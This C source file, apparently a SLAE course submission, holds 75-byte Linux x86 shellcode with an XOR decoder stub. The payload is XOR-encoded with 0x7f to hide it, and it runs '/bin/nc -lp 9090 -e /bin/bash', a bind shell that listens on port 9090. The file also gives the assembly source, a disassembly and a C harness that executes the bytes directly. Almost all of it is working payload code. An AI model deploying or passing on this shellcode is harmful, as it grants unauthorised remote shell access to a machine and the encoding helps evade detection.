/*
;
; Linux x86
; Author:  thryb
; Date:    13-07-17
; Purpose: /bin/nc -lp 9090 -le/bin/bash + decoder for 0x7f XORed
; Size:    75 bytes
; ID:      SLAE-770
;


global _start

section .text

_start:
        jmp short call_dec

decoder:
        pop esi ; get addr of shell:

xordec:
        xor byte [esi], 0x7f ; xor 0x7f byte per byte
        jz shell ; if 0 jmp to shell
        inc esi
        jmp short xordec ; loop back

call_dec:

        call decoder
        ; XORed 0x7f shellcode of /bin/nc -lp 9090 -le/bin/bash + 0x7f for jz
        shell: db 0x4e,0xbf,0x4e,0xad,0x2f,0x17,0x50,0x50,0x11,0x1c,0x17,0x50,0x1d,0x16,0x11,0xf6,0x9c,0x2f,0x17,0x1d,0x1e,0x0c,0x17,0x17,0x1d,0x16,0x11,0x50,0x17,0x52,0x13,0x1a,0x50,0xf6,0x99,0x2f,0x17,0x46,0x4f,0x46,0x4f,0x17,0x52,0x13,0x0f,0x5f,0xf6,0x98,0x2d,0x29,0x28,0x2c,0xf6,0x9e,0xcf,0x74,0xb2,0xff,0x7f


========================================================================================


No null 

nc-9090-bash-stack-xordec:     file format elf32-i386

Disassembly of section .text:

08048060 <_start>:
 8048060:       eb 09                   jmp    804806b <call_dec>

08048062 <decoder>:
 8048062:       5e                      pop    %esi

08048063 <xordec>:
 8048063:       80 36 7f                xorb   $0x7f,(%esi)
 8048066:       74 08                   je     8048070 <shell>
 8048068:       46                      inc    %esi
 8048069:       eb f8                   jmp    8048063 <xordec>

0804806b <call_dec>:
 804806b:       e8 f2 ff ff ff          call   8048062 <decoder>

08048070 <shell>:
 8048070:       4e                      dec    %esi
 8048071:       bf 4e ad 2f 17          mov    $0x172fad4e,%edi
 8048076:       50                      push   %eax
 8048077:       50                      push   %eax
 8048078:       11 1c 17                adc    %ebx,(%edi,%edx,1)
 804807b:       50                      push   %eax
 804807c:       1d 16 11 f6 9c          sbb    $0x9cf61116,%eax
 8048081:       2f                      das
 8048082:       17                      pop    %ss
 8048083:       1d 1e 0c 17 17          sbb    $0x17170c1e,%eax
 8048088:       1d 16 11 50 17          sbb    $0x17501116,%eax
 804808d:       52                      push   %edx
 804808e:       13 1a                   adc    (%edx),%ebx
 8048090:       50                      push   %eax
 8048091:       f6 99 2f 17 46 4f       negb   0x4f46172f(%ecx)
 8048097:       46                      inc    %esi
 8048098:       4f                      dec    %edi
 8048099:       17                      pop    %ss
 804809a:       52                      push   %edx
 804809b:       13 0f                   adc    (%edi),%ecx
 804809d:       5f                      pop    %edi
 804809e:       f6 98 2d 29 28 2c       negb   0x2c28292d(%eax)
 80480a4:       f6 9e cf 74 b2 ff       negb   -0x4d8b31(%esi)
 80480aa:       7f                      .byte 0x7f



*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x09\x5e\x80\x36\x7f\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x4e\xbf\x4e\xad\x2f\x17\x50\x50\x11\x1c\x17\x50\x1d\x16\x11\xf6\x9c\x2f\x17\x1d\x1e\x0c\x17\x17\x1d\x16\x11\x50\x17\x52\x13\x1a\x50\xf6\x99\x2f\x17\x46\x4f\x46\x4f\x17\x52\x13\x0f\x5f\xf6\x98\x2d\x29\x28\x2c\xf6\x9e\xcf\x74\xb2\xff\x7f";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
